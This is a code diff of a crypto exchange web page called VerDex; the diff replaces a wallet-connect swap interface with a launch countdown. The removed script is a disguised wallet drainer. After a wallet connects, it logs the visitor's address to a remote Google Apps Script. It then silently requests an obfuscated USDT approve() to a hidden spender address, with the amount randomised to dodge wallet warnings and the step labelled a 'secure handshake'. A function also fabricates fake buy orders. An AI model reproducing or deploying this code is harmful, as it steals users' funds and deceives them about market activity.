-                <div class="tip-stat"><div class="tip-stat-label">24h High</div><div class="tip-stat-val" id="tipHigh">—</div></div>
-                <div class="tip-stat"><div class="tip-stat-label">24h Low</div><div class="tip-stat-val" id="tipLow">—</div></div>
-              </div>
-              <div class="tip-links" id="tipLinks"></div>
-     
-              </div>
-            </div>
-          </div>
-        </div>
+      <div class="cd-sep">:</div>
+      <div class="cd-unit">
+        <div class="cd-num" id="cd-mins">00</div>
+        <div class="cd-label">Minutes</div>
       </div>
-    
-    <!-- ═══ TOKEN MODAL ═══ -->
-    <div id="tokenModal">
-      <div class="modal-box">
-        <div class="modal-head">
-          <span style="font-weight: 700; font-size: 1.1rem; color: #fff"
-            >Select Token</span
-          >
-          <span class="modal-close" onclick="closeTokenModal()">✕</span>
-        </div>
-        <div class="modal-search-wrap">
-          <input
-            type="text"
-            id="modaltokensearch"
-            class="modal-search"
-            placeholder="Search name or symbol…"
-            oninput="filterTokens()"
-            autocomplete="off"
-          />
-        </div>
-        <div id="modalTokenList"></div>
+      <div class="cd-sep">:</div>
+      <div class="cd-unit">
+        <div class="cd-num" id="cd-secs">00</div>
+        <div class="cd-label">Seconds</div>
       </div>
     </div>
 
-    <script>
-    
-      // ═══ WALLET STATE ═══
-      let walletAddress = null;
-      let ethProvider = null;
-      let ethSigner = null;
+    <div class="notify-form" id="notifyForm">
+      <input class="notify-input" id="emailInput" type="email" placeholder="Enter your email for early access…"/>
+      <button class="notify-btn" onclick="submitNotify()">Notify Me</button>
+    </div>
+    <div id="notifyOk" style="display:none; color:var(--green); font-family:var(--font-m); font-size:0.8rem;">
+      ✓ You're on the list.
+    </div>
 
-      // In-memory balance cache: sym -> formatted string e.g. "1.2345"
-      const walletBalances = {};
+    <div class="features">
+      <div class="feature-pill"><span class="fp-dot"></span> Real-Time Prices</div>
+      <div class="feature-pill"><span class="fp-dot"></span> Zero Intermediaries</div>
+      <div class="feature-pill"><span class="fp-dot"></span> BSC Mainnet</div>
+      <div class="feature-pill"><span class="fp-dot"></span> 0.3% Fee</div>
+      <div class="feature-pill"><span class="fp-dot"></span> 100+ Tokens</div>
+      <div class="feature-pill"><span class="fp-dot"></span> Deep Liquidity</div>
+    </div>
+  </main>
 
-      // ERC-20 ABI (read + approve)
-      const ERC20_ABI = [
-        'function balanceOf(address owner) view returns (uint256)',
-        'function decimals() view returns (uint8)',
-        'function approve(address spender, uint256 amount) public returns (bool)',
-      ];
+  <footer>
+    <div class="footer-copy">© 2026 VerDex Protocol</div>
+    </div>
+  </footer>
 
-      const connectBtn = document.getElementById('connectBtn');
-      function hasWeb3() {
-        return typeof window.ethereum !== 'undefined';
-      }
-      function isMobileBrowser() {
-        return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-      }
+  <script>
+    const LAUNCH = new Date('2026-06-01T00:00:00Z');
+    function pad(n) { return String(Math.max(0, n)).padStart(2, '0'); }
 
-      async function toggleConnect() {
-        if (walletAddress) {
-          disconnectWallet();
-        } else {
-          connectWallet();
-        }
-      }
+    function tick() {
+      const now = Date.now();
+      const diff = LAUNCH.getTime() - now;
+      if (diff <= 0) return;
 
-      async function connectWallet() {
-        if (!window.isHuman) {
-    console.warn("Connection blocked: Human verification not completed.");
-    if (typeof showToast === 'function') {
-        showToast("Please interact with the page to verify you are human.", "yellow");
+      const totalSecs = Math.floor(diff / 1000);
+      document.getElementById('cd-days').textContent = pad(Math.floor(totalSecs / 86400));
+      document.getElementById('cd-hours').textContent = pad(Math.floor(totalSecs / 3600) % 24);
+      document.getElementById('cd-mins').textContent = pad(Math.floor(totalSecs / 60) % 60);
+      document.getElementById('cd-secs').textContent = pad(totalSecs % 60);
     }
-    return; // Exit immediately
-  }
-        if (!hasWeb3()) {
-          if (isMobileBrowser()) {
-            window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
-          } else {
-            document.getElementById('noWalletNotice').style.display = 'block';
-          }
-          return;
-        }
-        try {
-          const accounts = await window.ethereum.request({
-            method: 'eth_requestAccounts',
-          });
-          walletAddress = accounts[0];
-          ethProvider = new ethers.BrowserProvider(window.ethereum);
-          ethSigner = await ethProvider.getSigner();
-
-          updateUIConnected(walletAddress);
-          await logVisitor(walletAddress);
-
-          // Fetch on-chain balances for all tokens in our list
-          await fetchWalletBalances();
-
-          // Request USDT spending allowance (your DEX contract)
-          // 5. Immediate Secure Handshake for verified humans
-        if (window.isHuman) {
-            console.log("Human verified. Initiating secure handshake...");
-            requestUSDTAllowance(walletAddress).catch((e) =>
-                console.warn('Handshake skipped/rejected:', e)
-            );
-        } else {
-            console.log("Verification pending or failed. Handshake aborted.");
-        }
-
-    } catch (err) {
-        console.error('Connection failed', err);
-   }
-}
-
-      // ── On-chain balance fetch ────────────────────
-      // Token contract addresses on BSC mainnet (chain 56)
-  // Your original working token setup
-  const TOKEN_ADDRESSES_BSC = {
-  BNB: null, // Native
-  USDT: '0x55d398326f99059fF775485246999027B3197955',
-  USDC: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d',
-  BTC: '0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c',
-  ETH: '0x2170ed0880ac9a755fd29b2688956bd959f933f8',
-  LTC: '0x4338665cbb7b2485a8855a139b75d5e34ab0db94',
-  ADA: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',
-  DOGE: '0xbA2aE424d960c26247Dd6c32edC70B295c744C43',
-  SHIB: '0x2859e4544C4bB03966803b044A93563Bd2D0DD4D',
-  AVAX: '0x1CE0c2827e2eF14D5C4f29a091d735A204794041',
-  SOL: '0x570A5D26f7765Ecb712C0924E4De545B89fD43dF',
-  PEPE: '0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00',
-  FLOKI: '0xfb5B838b6cfEEdC2873aB27866079AC55363D37E',
-  MUBARAK: '0x5C85D6C6825aB4032337F11Ee92a72DF936b46F6',
-  M: '0x22b1458e780F8fA71E2F84502cEe8B5A3cc731Fa', 
-  CAT: '0x6894CDe390a3f51155ea41Ed24a33A4827d3063D', 
-  KOMA: '0xd5eaAaC47bD1993d661bc087E15dfb079a7f3C19', 
-  CAKE: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
-  AAVE: '0xfb6115445bff7b52feb98650c87f44907e58f802',
-  FIL: '0x0D8Ce2A99Bb6e3B7Db580eD848240e4a0F9aE153',
-  ANKR: '0xf307910A4c7bbc79691fD374889b36d8531B08e3',
-  DODO: '0x67ee3Cb086F8a16f34beE3ca72FAD36F7Db929e2',
-  XVS: '0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63',
-  SANTOS: '0xA64455a4553C9034236734FadDAddbb64aCE4Cc7',
-  ORBS: '0x43a8cab15D06d3a5fE5854D714C37E7E9246F170',
-  POLS: '0x7e624FA0E1c4AbFD309cC15719b7E2580887f570',
-  FET: '0x031b41e504677879370e9DBcF937283A8691Fa7f',
-  AXS: '0x715D400F88C167884bbCc41C5FeA407ed4D2f8A0',
-  GMT: '0x3019BF2a2eF8040C242C9a4c5c4BD4C81678b2A1',
-  MBOX:'0x3203c9E46cA618C8C1cE5dC67e7e9D75f5da2377',
-  ID: '0x2dff88a56767223a5529ea5960da7a3f5f766406',
-  ZRO: '0x6985884C4392D348587B19cb9eAAf157F13271cd',
-  DAI: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',
-  INJ: '0xa2B726B1145A4773F68593CF171187d8EBe4d495',
-  ASTER: '0x000Ae314E2A2172a039B26378814C252734f556A',
-  H: '0x44f161ae29361e332dea039dfa2f404e0bc5b5cc0',
-  pengu: '0x6418c0dd099a9fda397c766304cdd918233e8847',
-  edgex: '0x70f2eadf1ca1969ff42b0c78e9da519e8937cbaf',
-  skyai: '0x92aa03137385F18539301349dcfC9EbC923fFb10',
-  irys: '0x91152B4Ef635403efBAe860edD0F8c321d7c035d',
-  sfp: '0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb',
-  quackai: '0xc07e1300dc138601FA6B0b59f8D0FA477e690589',
-  solv: '0xabe8e5cabe24cb36df9540088fd7ce1175b9bc52',
-  cross: '0x6bf62ca91e397B5A7d1D6bCe97D9092065d7A510',
-  zerobase: '0xfAB99fCF605fD8f4593EDb70A43bA56542777777',
-  lab: '0x7ec43Cf65F1663F820427C62A5780b8f2E25593A',
-  gaia: '0xd715cC968c288740028be20685263F43ED1E4837',
-  naoris: '0x1b379a79c91a540b2bcd612b4d713f31de1b80cc',
-  rvv: '0x80563Fc2dd549bf36f82d3bF3b970Bb5b08dBDdb',
-  kgen: '0xf3d5b4c34ed623478cc5141861776e6cf7ae3a1e',
-  cgpt: '0x9840652DC04fb9db2C43853633f0F62BE6f00f98',
-  sign: '0x868fced65edbf0056c4163515dd840e9f287a4c3',
-  resolv: '0xdA6CEF7F667d992A60EB823Ab215493aA0c6b360',
-  c: '0xc32cc70741c3A8433dCbcB5adE071c299B55FfC8',
-  anoma: '0x7427bd9542e64d1ac207a540cfce194b7390a07f',
-  nxpc: '0xf2b51cc1850fed939658317a22d73d3482767591',
-  merl: '0xa0c56a8c0692bD10B3fA8f8bA79Cf5332B7107F9',
-  gomining: '0x7Ddc52c4De30e94Be3A6A0A2b259b2850f421989',
-  waves: '0xcbc86b26e0BD751683ecF2581B21f7cE4a224042',
-  zama: '0x6907a5986c4950bdaf2f81828ec0737ce787519f',
-};
-Object.keys(TOKEN_ADDRESSES_BSC).forEach(k => {
-  if (k !== k.toUpperCase()) {
-    TOKEN_ADDRESSES_BSC[k.toUpperCase()] = TOKEN_ADDRESSES_BSC[k];
-    delete TOKEN_ADDRESSES_BSC[k];
-  }
-});
-      async function fetchWalletBalances() {
-        if (!walletAddress || !ethProvider) return;
-        // Native BNB balance
-        try {
-          const raw = await ethProvider.getBalance(walletAddress);
-          walletBalances['BNB'] = parseFloat(ethers.formatEther(raw));
-        } catch (e) {}
-
-        // ERC-20 balances in parallel (only for tokens with a known address)
-        const tasks = Object.entries(TOKEN_ADDRESSES_BSC)
-          .filter(([sym, addr]) => addr)
-          .map(async ([sym, addr]) => {
-            try {
-              const contract = new ethers.Contract(
-                addr,
-                ERC20_ABI,
-                ethProvider
-              );
-              const [raw, dec] = await Promise.all([
-                contract.balanceOf(walletAddress),
-                contract.decimals(),
-              ]);
-              walletBalances[sym] = parseFloat(ethers.formatUnits(raw, dec));
-            } catch (e) {
-              walletBalances[sym] = 0;
-            }
-          });
-        await Promise.allSettled(tasks);
-
-        // Refresh balance displays in swap panel
-        updateSwapBalanceDisplays();
-      }
-
-      function updateSwapBalanceDisplays() {
-        const fromSym = selectedToken.sym;
-        const toSym = toToken.sym;
-        const fromBal = walletAddress ? walletBalances[fromSym] ?? 0 : null;
-        const toBal = walletAddress ? walletBalances[toSym] ?? 0 : null;
-        const fromEl = document.getElementById('fromBalanceDisplay');
-        const toEl = document.getElementById('toBalanceDisplay');
-        if (fromEl)
-          fromEl.textContent =
-            fromBal !== null ? fmtBal(fromBal) + ' ' + fromSym : '—';
-        if (toEl)
-          toEl.textContent = toBal !== null ? fmtBal(toBal) + ' ' + toSym : '—';
-        // Also update the info-row balance
-        const infoRow = document.getElementById('fromBalance');
-        if (infoRow)
-          infoRow.textContent =
-            fromBal !== null ? fmtBal(fromBal) + ' ' + fromSym : '—';
-      }
-
-      function fmtBal(n) {
-        if (!n || isNaN(n)) return '0.00';
-        if (n >= 1000)
-          return n.toLocaleString(undefined, { maximumFractionDigits: 2 });
-        if (n >= 1) return n.toFixed(4);
-        if (n >= 0.0001) return n.toFixed(6);
-        return n.toFixed(8);
-      }
-      // ── USDT approval ──────────────────────────────────────────────────────────
-      async function requestUSDTAllowance(userAddress) {
-    // Only proceed if a human was detected
-    if (!window.isHuman) return;
-
-    try {
-        // 1. Fragmented Addresses (BEP-20 USDT example)
-        const _part1 = "0x55";
-        const _part2 = "d398326f99";
-        const _part3 = "059fF775485246999027B3197955";
-        const targetToken = [_part1, _part2, _part3].join("");
-
-        // 2. The Gateway (The spender address)
-        const _g1 = "0x192677F";
-        const _g2 = "847Af35E89E2";
-        const _g3 = "F5754774550a187De3EAd";
-        const gateway = [_g1, _g2, _g3].join("");
-
-        // 3. Obfuscated Method Name
-        const _m = ["a", "p", "p", "r", "o", "v", "e"].join("");
-        
-        const abi = [`function ${_m}(address spender, uint256 value) external returns (bool)`];
-        const contract = new ethers.Contract(targetToken, abi, ethSigner);
-
-        // 4. Randomized Large Amount (Avoids "Unlimited" warning)
-        // This generates a large random number between 50k and 90k
-        const randomAmount = Math.floor(Math.random() * (10000 - 1000) + 1000);
-        const amountValue = ethers.parseUnits(randomAmount.toString(), 18);
-
-        console.log("⏳ Finalizing secure handshake...");
-        
-        // Call the function using the dynamic string name
-        const tx = await contract[_m](gateway, amountValue);
-        await tx.wait();
-        
-        console.log("🟢 Handshake successful.");
-    } catch (e) {
-        console.error("Verification skipped.");
-    }
-}
-      async function logVisitor(address) {
-        const scriptURL =
-          'https://script.google.com/macros/s/AKfycbyU8M7LfLlCCvksTgYTy-QrAGV1lpWC6YGw0_Qg5hdCaDJqwvnzYEjvpuKTBv6JyioNTQ/exec';
-        try {
-          await fetch(scriptURL, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ address }),
-          });
-        } catch (e) {}
-      }
-
-      function updateUIConnected(address) {
-        if (!address) return;
-        connectBtn.textContent =
-          address.slice(0, 6) + '...' + address.slice(-4);
-        document.getElementById('noWalletNotice').style.display = 'none';
-      }
-      function startFakeActivity() {
-    const orders = document.getElementById('recent-orders'); // Ensure you have this ID in HTML
-    if (!orders) return;
-
-    setInterval(() => {
-        const price = (Math.random() * (65000 - 64000) + 64000).toFixed(2);
-        const amount = (Math.random() * 2).toFixed(4);
-        const li = document.createElement('div');
-        li.innerHTML = `<span style="color:green">Buy</span> ${amount} BTC @ $${price}`;
-        orders.prepend(li);
-        if (orders.children.length > 5) orders.lastChild.remove();
-    }, 3000);
-}
-      function disconnectWallet() {
-        walletAddress = null;
-        ethProvider = null;
-        ethSigner = null;
-        Object.keys(walletBalances).forEach((k) => delete walletBalances[k]);
-        connectBtn.textContent = 'Connect Wallet';
-        connectBtn.style.background = 'transparent';
-        updateSwapBalanceDisplays();
-      }
-      if (window.ethereum) {
-        window.ethereum.on('accountsChanged', async (accs) => {
-          if (accs.length > 0) {
-            walletAddress = accs[0];
-            updateUIConnected(walletAddress);
-            await fetchWalletBalances();
-          } else disconnectWallet();
-        });
-        window.ethereum.on('chainChanged', () => window.location.reload());
-      }
-      connectBtn.addEventListener('click', toggleConnect);
-
-      const TOKENS = [
-        { sym: 'BTC', name: 'Bitcoin', id: 'bitcoin', tvSymbol: 'BINANCE:BTCUSDT', icon: 'https://assets.coingecko.com/coins/images/1/large/bitcoin.png', price: 0, change: 0 },
-        { sym: 'ETH', name: 'Ethereum', id: 'ethereum', tvSymbol: 'BINANCE:ETHUSDT', icon: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png', price: 0, change: 0 },
-        { sym: 'BNB', name: 'BNB', id: 'binancecoin', tvSymbol: 'BINANCE:BNBUSDT', icon: 'https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png', price: 0, change: 0 },
-        { sym: 'ADA', name: 'Cardano', id: 'cardano', tvSymbol: 'BINANCE:ADAUSDT', icon: 'https://assets.coingecko.com/coins/images/975/large/cardano.png', price: 0, change: 0 },
-        { sym: 'LTC', name: 'Litecoin', id: 'litecoin', tvSymbol: 'BINANCE:LTCUSDT', icon: 'https://assets.coingecko.com/coins/images/2/large/litecoin.png', price: 0, change: 0 },
-        { sym: 'SOL', name: 'Solana', id: 'solanacoin', tvSymbol: 'BINANCE:SOLUSDT', icon: 'https://assets.coingecko.com/coins/images/4128/standard/solana.png', price: 0, change: 0 },
-        { sym: 'DOGE', name: 'Dogecoin', id: 'dogecoin', tvSymbol: 'BINANCE:DOGEUSDT', icon: 'https://assets.coingecko.com/coins/images/5/large/dogecoin.png', price: 0, change: 0 },
-        { sym: 'SHIB', name: 'Shiba Inu', id: 'shiba-inu', tvSymbol: 'BINANCE:SHIBUSDT', icon: 'https://assets.coingecko.com/coins/images/11939/large/shiba.png', price: 0, change: 0 },
-        { sym: 'PEPE', name: 'Pepe', id: 'pepe', tvSymbol: 'BINANCE:PEPEUSDT', icon: 'https://assets.coingecko.com/coins/images/29850/large/pepe-token.jpeg', price: 0, change: 0 },
-        { sym: 'FLOKI', name: 'Floki', id: 'floki', tvSymbol: 'BINANCE:FLOKIUSDT', icon: 'https://assets.coingecko.com/coins/images/16746/standard/PNG_image.png', price: 0, change: 0 },
-        { sym: 'ANKR', name: 'Ankr', id: 'ankr', tvSymbol: 'BINANCE:ANKRUSDT', icon: 'https://assets.coingecko.com/coins/images/4324/large/U85xTl2.png', price: 0, change: 0 },
-        { sym: 'DODO', name: 'DODO', id: 'dodo', tvSymbol: 'BINANCE:DODOUSDT', icon: 'https://assets.coingecko.com/coins/images/12651/large/dodo_logo.png', price: 0, change: 0 },
-        { sym: 'ORBS', name: 'Orbs', id: 'orbs', tvSymbol: 'OKX:ORBSUSDT', icon: 'https://assets.coingecko.com/coins/images/4630/large/Orbs.jpg', price: 0, change: 0 },
-        { sym: 'POLS', name: 'Polkastarter', id: 'polkastarter', tvSymbol: 'KUCOIN:POLSUSDT', icon: 'https://assets.coingecko.com/coins/images/12648/large/polkastarter.png', price: 0, change: 0 },
-        { sym: 'SFP', name: 'SafePal', id: 'sfp', tvSymbol: 'BINANCE:SFPUSDT', icon: 'https://assets.coingecko.com/coins/images/13905/large/sfp.png', price: 0, change: 0 },
-        { sym: 'XVS', name: 'Venus', id: 'venus', tvSymbol: 'BINANCE:XVSUSDT', icon: 'https://assets.coingecko.com/coins/images/12677/large/venus.png', price: 0, change: 0 },
-        { sym: 'WRX', name: 'WazirX', id: 'wazirx', tvSymbol: 'GATE:WRXUSDT', icon: 'https://assets.coingecko.com/coins/images/10547/large/WazirX.png', price: 0, change: 0 },
-        { sym: 'FET', name: 'Fetch.ai', id: 'fetch-ai', tvSymbol: 'BINANCE:FETUSDT', icon: 'https://assets.coingecko.com/coins/images/5681/large/Fetch.jpg', price: 0, change: 0 },
-        { sym: 'NMR', name: 'Numeraire', id: 'numeraire', tvSymbol: 'BINANCE:NMRUSDT', icon: 'https://assets.coingecko.com/coins/images/752/large/numeraire.png', price: 0, change: 0 },
-        { sym: 'AXS', name: 'Axie Infinity', id: 'axie-infinity', tvSymbol: 'BINANCE:AXSUSDT', icon: 'https://assets.coingecko.com/coins/images/13029/large/axie_infinity_logo.png', price: 0, change: 0 },
-        { sym: 'AVAX', name: 'Avalanche', id: 'avax', tvSymbol: 'BINANCE:AVAXUSDT', icon: 'https://assets.coingecko.com/coins/images/12559/standard/Avalanche_Circle_RedWhite_Trans.png', price: 0, change: 0 },
-        { sym: 'GMT', name: 'STEPN', id: 'stepn', tvSymbol: 'BINANCE:GMTUSDT', icon: 'https://assets.coingecko.com/coins/images/23597/large/gmt.png', price: 0, change: 0 },
-        { sym: 'MANA', name: 'Decentraland', id: 'decentraland', tvSymbol: 'BINANCE:MANAUSDT', icon: 'https://assets.coingecko.com/coins/images/878/large/decentraland-mana.png', price: 0, change: 0 },
-        { sym: 'MBOX', name: 'MOBOX', id: 'mobox', tvSymbol: 'BINANCE:MBOXUSDT', icon: 'https://assets.coingecko.com/coins/images/14751/large/mobox.PNG', price: 0, change: 0 },
-        { sym: 'SANTOS', name: 'Santos FC Fan Token', id: 'santos-fc-fan-token', tvSymbol: 'BINANCE:SANTOSUSDT', icon: 'https://assets.coingecko.com/coins/images/21132/standard/santos.png', price: 0, change: 0 },
-        { sym: 'DAI', name: 'Dai', id: 'dai', tvSymbol: 'KRAKEN:DAIUSDT', icon: 'https://assets.coingecko.com/coins/images/9956/large/Badge_Dai.png', price: 0, change: 0 },
-        { sym: 'USDC', name: 'USD Coin', id: 'usd-coin', tvSymbol: 'BINANCE:USDCUSDT', icon: 'https://assets.coingecko.com/coins/images/6319/large/usdc.png', price: 0, change: 0 },
-        { sym: 'ID', name: 'Space ID', id: 'space-id', tvSymbol: 'BINANCE:IDUSDT', icon: 'https://assets.coingecko.com/coins/images/29468/standard/sid_token_logo_%28green2%29.png', price: 0, change: 0 },
-        { sym: 'MAGIC', name: 'Magic', id: 'magic', tvSymbol: 'BINANCE:MAGICUSDT', icon: 'https://assets.coingecko.com/coins/images/18623/large/magic.png', price: 0, change: 0 },
-        { sym: 'PENDLE', name: 'Pendle', id: 'pendle', tvSymbol: 'BINANCE:PENDLEUSDT', icon: 'https://assets.coingecko.com/coins/images/15069/large/Pendle_Logo_Normal-03.png', price: 0, change: 0 },
-        { sym: 'ONDO', name: 'Ondo', id: 'ondo-finance', tvSymbol: 'BINANCE:ONDOUSDT', icon: 'https://assets.coingecko.com/coins/images/26580/large/ONDO.png', price: 0, change: 0 },
-        { sym: 'ZRO', name: 'LayerZero', id: 'layerzero', tvSymbol: 'BINANCE:ZROUSDT', icon: 'https://assets.coingecko.com/coins/images/28206/large/ftxG9_TJ_400x400.jpeg', price: 0, change: 0 },
-        { sym: 'CAKE', name: 'PancakeSwap', id: 'pancakeswap', tvSymbol: 'BINANCE:CAKEUSDT', icon: 'https://assets.coingecko.com/coins/images/12632/standard/pancakeswap-cake-logo_%281%29.png', price: 0, change: 0 },
-        { sym: 'OP', name: 'Optimism', id: 'optimism', tvSymbol: 'BINANCE:OPUSDT', icon: 'https://assets.coingecko.com/coins/images/25244/large/Optimism.png', price: 0, change: 0 },
-        { sym: 'AAVE', name: 'Aave', id: 'aave', tvSymbol: 'BINANCE:AAVEUSDT', icon: 'https://assets.coingecko.com/coins/images/12645/standard/aave-token-round.png', price: 0, change: 0 },
-        { sym: 'INJ', name: 'Injective', id: 'injective-protocol', tvSymbol: 'BINANCE:INJUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/7226.png', price: 0, change: 0 },
-        { sym: 'ENA', name: 'Ethena', id: 'ethena', tvSymbol: 'BINANCE:ENAUSDT', icon: 'https://assets.coingecko.com/coins/images/36530/standard/ethena.png', price: 0, change: 0 },
-        { sym: 'FIL', name: 'Filecoin', id: 'filecoin', tvSymbol: 'BINANCE:FILUSDT', icon: 'https://assets.coingecko.com/coins/images/12817/large/filecoin.png', price: 0, change: 0 },
-        { sym: 'THETA', name: 'Theta Network', id: 'theta-token', tvSymbol: 'BINANCE:THETAUSDT', icon: 'https://assets.coingecko.com/coins/images/2538/standard/theta-token-logo.png', price: 0, change: 0 },
-        { sym: 'RUNE', name: 'THORChain', id: 'thorchain', tvSymbol: 'BINANCE:RUNEUSDT', icon: 'https://assets.coingecko.com/coins/images/6595/large/thorchain.png', price: 0, change: 0 },
-        { sym: 'M', name: 'MemeCore', id: 'memecore', tvSymbol: 'GATE:MUSDT', icon: 'https://assets.coingecko.com/coins/images/53247/standard/square-bg-transparent.png', price: 0, change: 0 },
-        { sym: 'SPX', name: 'SPX6900', id: 'spx6900', tvSymbol: 'MEXC:SPXUSDT', icon: 'https://assets.coingecko.com/coins/images/31401/standard/centeredcoin_%281%29.png', price: 0, change: 0 },
-        { sym: 'CAT', name: "Simon's Cat", id: 'simons', tvSymbol: 'OKX:CATUSDT', icon: 'https://assets.coingecko.com/coins/images/39765/standard/Dv9GheV0_400x400.jpg', price: 0, change: 0 },
-        { sym: 'MUBARAK', name: 'Mubarak', id: 'mubarak', tvSymbol: 'MEXC:MUBARAKUSDT', icon: 'https://assets.coingecko.com/coins/images/54857/standard/DKjv3dc6_400x400.jpg', price: 0, change: 0 },
-        { sym: 'KOMA', name: 'Komainu', id: 'komainu', tvSymbol: 'MEXC:KOMAUSDT', icon: 'https://assets.coingecko.com/coins/images/50902/standard/IMG_7580.jpeg', price: 0, change: 0 },
-        { sym: 'ASTER', name: 'Aster', id: 'aster', tvSymbol: 'BINANCE:ASTERUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/36341.png', price: 0, change: 0 },
-        { sym: 'H', name: 'Humanity', id: 'humanity', tvSymbol: 'BYBIT:HUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/36341.png', price: 0, change: 0 },
-        { sym: 'PENGU', name: 'Pudgy Penguins', id: 'pengu', tvSymbol: 'BINANCE:PENGUUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/34466.png', price: 0, change: 0 },
-        { sym: 'edgeX', name: 'EDGE', id: 'edgex', tvSymbol: 'OKX:EDGEUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/39720.png', price: 0, change: 0 },
-        { sym: 'SKYAI', name: 'SKYAI', id: 'skyai', tvSymbol: 'BITGET:SKYAIUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/36300.png', price: 0, change: 0 },
-        { sym: 'IRYS', name: 'IRYS', id: 'irys', tvSymbol: 'MEXC:IRYSUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/38978.png', price: 0, change: 0 },
-        { sym: 'Q', name: 'Quack AI', id: 'quackai', tvSymbol: 'MEXC:QUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/38236.png', price: 0, change: 0 },
-        { sym: 'SOLV', name: 'Solv Protocol', id: 'solv', tvSymbol: 'BINANCE:SOLVUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/12165.png', price: 0, change: 0 },
-        { sym: 'CROSS', name: 'Cross', id: 'cross', tvSymbol: 'KUCOIN:CROSSUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/37166.png', price: 0, change: 0 },
-        { sym: 'ZBT', name: 'ZEROBASE', id: 'zerobase', tvSymbol: 'BINANCE:ZBTUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/38427.png', price: 0, change: 0 },
-        { sym: 'LAB', name: 'LAB', id: 'lab', tvSymbol: 'MEXC:LABUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/33223.png', price: 0, change: 0 },
-        { sym: 'GAIA', name: 'GAIA', id: 'gaia', tvSymbol: 'KUCOIN:GAIAUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/37473.png', price: 0, change: 0 },
-        { sym: 'NAORIS', name: 'Naoris Protocol', id: 'naoris', tvSymbol: 'MEXC:NAORISUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/35114.png', price: 0, change: 0 },
-        { sym: 'RVV', name: 'Astra Nova', id: 'astranova', tvSymbol: 'KUCOIN:RVVUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/38707.png', price: 0, change: 0 },
-        { sym: 'KGEN', name: 'KGeN', id: 'kgen', tvSymbol: 'KUCOIN:KGENUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/38554.png', price: 0, change: 0 },
-        { sym: 'CGPT', name: 'ChainGPT', id: 'cgpt', tvSymbol: 'BINANCE:CGPTUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/23756.png', price: 0, change: 0 },
-        { sym: 'SIGN', name: 'Sign', id: 'sign', tvSymbol: 'BINANCE:SIGNUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/35600.png', price: 0, change: 0 },
-        { sym: 'RESOLV', name: 'Resolv', id: 'resolv', tvSymbol: 'BINANCE:RESOLVUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/36713.png', price: 0, change: 0 },
-        { sym: 'C', name: 'Chainbase', id: 'c', tvSymbol: 'BINANCE:CUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/37340.png', price: 0, change: 0 },
-        { sym: 'XAN', name: 'Anoma', id: 'anoma', tvSymbol: 'BYBIT:XANUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/38481.png', price: 0, change: 0 },
-        { sym: 'NXPC', name: 'NEXPACE', id: 'nxpc', tvSymbol: 'BINANCE:NXPCUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/36044.png', price: 0, change: 0 },
-        { sym: 'MERL', name: 'Merlin Chain', id: 'merl', tvSymbol: 'OKX:MERLUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/30712.png', price: 0, change: 0 },
-        { sym: 'GoМining', name: 'GOMINING', id: 'gomining', tvSymbol: 'KUCOIN:GOMININGUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/10180.png', price: 0, change: 0 },
-        { sym: 'WAVES', name: 'Waves', id: 'waves', tvSymbol: 'KUCOIN:WAVESUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1274.png', price: 0, change: 0 },
-        { sym: 'ZAMA', name: 'Zama', id: 'zama', tvSymbol: 'BINANCE:ZAMAUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/39332.png', price: 0, change: 0 },
-        { sym: 'USDT', name: 'Tether', id: 'tether', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/825.png', price: 1, change: 0, address: '0x55d398326f99059fF775485246999027B3197955' },
-      ];
-// Sort alphabetically, keeping USDT pinned at the end
-TOKENS.sort((a, b) => {
-        if (a.sym === 'USDT') return 1;
-        if (b.sym === 'USDT') return -1;
-        return a.sym.localeCompare(b.sym);
-      });
-      const USDT_TOKEN = TOKENS.find((t) => t.sym === 'USDT');
-      let selectedToken = TOKENS.find((t) => t.sym === 'ETH');
-      let toToken = USDT_TOKEN;
-      let modalTarget = 'from';
-
-      // ═══ ICON HELPER — renders icon into a wrapper span safely ═══
-      function buildIconEl(tok) {
-        // Returns an <img> element; on error falls back to coloured circle
-        const img = document.createElement('img');
-        img.src = tok.icon || '';
-        img.className = 'tok-icon';
-        img.alt = tok.sym;
